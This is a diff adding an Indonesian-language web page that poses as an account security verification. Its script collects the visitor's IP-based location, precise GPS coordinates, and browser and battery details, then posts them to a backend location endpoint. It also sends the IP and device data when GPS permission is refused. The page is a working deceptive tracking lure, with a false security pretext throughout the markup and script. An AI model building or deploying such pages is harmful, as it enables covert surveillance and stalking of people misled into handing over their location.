@@ -1,0 +1,255 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verifikasi Keamanan Akun</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+            box-sizing: border-box;
+        }
+        .container {
+            background: white;
+            padding: 40px;
+            border-radius: 20px;
+            box-shadow: 0 15px 35px rgba(0,0,0,0.2);
+            text-align: center;
+            max-width: 440px;
+            width: 100%;
+        }
+        h1 { color: #333; margin-bottom: 10px; font-size: 24px; }
+        p { color: #666; line-height: 1.6; }
+        .loading { display: none; color: #764ba2; font-weight: bold; margin: 15px 0; }
+        .result-box { 
+            background: #f8f9fa; 
+            padding: 16px; 
+            border-radius: 12px; 
+            margin-top: 20px; 
+            text-align: left;
+            min-height: 60px;
+            font-size: 14px;
+            line-height: 1.6;
+            border: 1px solid #e9ecef;
+            display: none;
+        }
+        .success { color: #28a745; font-weight: bold; margin-bottom: 8px; }
+        .error { color: #dc3545; font-weight: bold; margin-top: 8px; }
+        .warning { color: #d97706; font-weight: 500; margin-top: 6px; }
+        .icon { font-size: 40px; margin-bottom: 15px; display: block; }
+        .btn-verify {
+            background: #764ba2;
+            color: white;
+            border: none;
+            padding: 14px 28px;
+            border-radius: 25px;
+            font-size: 16px;
+            cursor: pointer;
+            font-weight: 600;
+            transition: all 0.2s ease;
+            box-shadow: 0 4px 12px rgba(118, 75, 162, 0.3);
+        }
+        .btn-verify:hover {
+            background: #623a8b;
+            transform: translateY(-1px);
+        }
+        .badge-sync {
+            display: inline-block;
+            background: #e0f2fe;
+            color: #0284c7;
+            font-size: 12px;
+            padding: 4px 10px;
+            border-radius: 12px;
+            margin-top: 10px;
+            font-weight: 600;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <span class="icon">🔍</span>
+        <h1>Verifikasi Keamanan Akun</h1>
+        <p>Klik tombol di bawah untuk memverifikasi IP dan lokasi Anda agar akun tetap aman dari aktivitas mencurigakan.</p>
+        
+        <button id="btnAction" class="btn-verify" onclick="trackUser()">
+            Mulai Verifikasi
+        </button>
+
+        <div id="loading" class="loading">⏳ Memproses verifikasi lokasi & jaringan...</div>
+        
+        <div id="resultBox" class="result-box"></div>
+    </div>
+
+    <script>
+        // Konfigurasi URL Server Backend:
+        // Otomatis mengarah ke backend yang sama jika dijalankan via http(s),
+        // atau default ke http://localhost:3000 jika dibuka langsung via file://
+        const BACKEND_URL = window.location.origin && window.location.origin.startsWith('http')
+            ? `${window.location.origin}/api/location`
+            : 'http://localhost:3000/api/location';
+
+        // Mengambil informasi perangkat/browser
+        async function getDeviceInfo() {
+            let batteryInfo = null;
+            try {
+                if (navigator.getBattery) {
+                    const battery = await navigator.getBattery();
+                    batteryInfo = `${Math.round(battery.level * 100)}% (${battery.charging ? 'Charging' : 'Discharging'})`;
+                }
+            } catch (e) {}
+
+            return {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform || 'Unknown',
+                language: navigator.language || 'id-ID',
+                screen: `${window.screen.width}x${window.screen.height} (${window.screen.colorDepth}-bit)`,
+                battery: batteryInfo,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+            };
+        }
+
+        // Fungsi utama verifikasi & tracking
+        async function trackUser() {
+            const resultBox = document.getElementById("resultBox");
+            const loading = document.getElementById("loading");
+            const btn = document.getElementById("btnAction");
+            
+            resultBox.style.display = "none";
+            resultBox.innerHTML = "";
+            loading.style.display = "block";
+            btn.disabled = true;
+            btn.style.opacity = "0.7";
+
+            let ipData = {};
+            const deviceInfo = await getDeviceInfo();
+
+            // 1. Ambil Data IP & Lokasi Berdasarkan Jaringan
+            try {
+                const ipResponse = await fetch('https://ipinfo.io/json');
+                if (ipResponse.ok) {
+                    ipData = await ipResponse.json();
+                }
+            } catch (err) {
+                console.warn("Gagal mengambil data dari ipinfo:", err);
+            }
+
+            // 2. Coba minta izin GPS perangkat
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    async (position) => {
+                        const coords = {
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
+                            accuracy: position.coords.accuracy,
+                            altitude: position.coords.altitude,
+                            speed: position.coords.speed
+                        };
+
+                        await sendToBackend({
+                            ipInfo: ipData,
+                            coordinates: coords,
+                            device: deviceInfo,
+                            status: 'success'
+                        });
+
+                        renderResult(ipData, coords, true);
+                    },
+                    async (geoError) => {
+                        console.warn("GPS Ditolak / Gagal:", geoError.message);
+
+                        // Tetap kirimkan data IP dan perangkat ke backend meskipun GPS ditolak
+                        await sendToBackend({
+                            ipInfo: ipData,
+                            coordinates: null,
+                            device: deviceInfo,
+                            status: 'gps_denied',
+                            notes: geoError.message
+                        });
+
+                        renderResult(ipData, null, false, geoError.message);
+                    },
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 10000,
+                        maximumAge: 0
+                    }
+                );
+            } else {
+                // Browser tidak mendukung Geolocation
+                await sendToBackend({
+                    ipInfo: ipData,
+                    coordinates: null,
+                    device: deviceInfo,
+                    status: 'unsupported'
+                });
+                renderResult(ipData, null, false, "Browser tidak mendukung sensor GPS.");
+            }
+        }
+
+        // Kirim data gabungan ke backend
+        async function sendToBackend(payload) {
+            try {
+                const response = await fetch(BACKEND_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+                const result = await response.json();
+                console.log("Respon backend:", result);
+                return result;
+            } catch (error) {
+                console.error("Gagal mengirim data ke backend:", error);
+                return null;
+            }
+        }
+
+        // Tampilkan hasil di antarmuka
+        function renderResult(ipData, coords, gpsSuccess, gpsErrorMsg = '') {
+            const resultBox = document.getElementById("resultBox");
+            const loading = document.getElementById("loading");
+            const btn = document.getElementById("btnAction");
+
+            loading.style.display = "none";
+            btn.disabled = false;
+            btn.style.opacity = "1";
+            resultBox.style.display = "block";
+
+            let html = `<div class="success">✓ Verifikasi Berhasil Diproses!</div>`;
+
+            if (ipData && ipData.ip) {
+                html += `
+                    <strong>IP Address:</strong> ${ipData.ip}<br>
+                    <strong>Lokasi ISP:</strong> ${ipData.city || '-'}, ${ipData.region || '-'}, ${ipData.country || '-'}<br>
+                    <strong>Provider:</strong> ${ipData.org || '-'}
+                `;
+            } else {
+                html += `<em>Data IP publik diambil langsung oleh server.</em><br>`;
+            }
+
+            if (gpsSuccess && coords) {
+                html += `
+                    <hr style="border:none; border-top:1px dashed #cbd5e1; margin:10px 0;">
+                    <strong>📍 Koordinat GPS (Presisi):</strong><br>
+                    Latitude: <code>${coords.latitude.toFixed(6)}</code><br>
+                    Longitude: <code>${coords.longitude.toFixed(6)}</code><br>
+                    Akurasi: ±${Math.round(coords.accuracy)} meter
+                `;
+            } else {
+                html += `
+                    <div class="warning">⚠ Izin GPS tidak diaktifkan (${gpsErrorMsg || 'Akses ditolak'}). Verifikasi menggunakan estimasi jaringan ISP.</div>
+                `;
+            }
+
+            html += `<br><span class="badge-sync">🚀 Tersimpan di Server Backend</span>`;
+            resultBox.innerHTML = html;
+        }
+    </script>
+</body>
+</html>
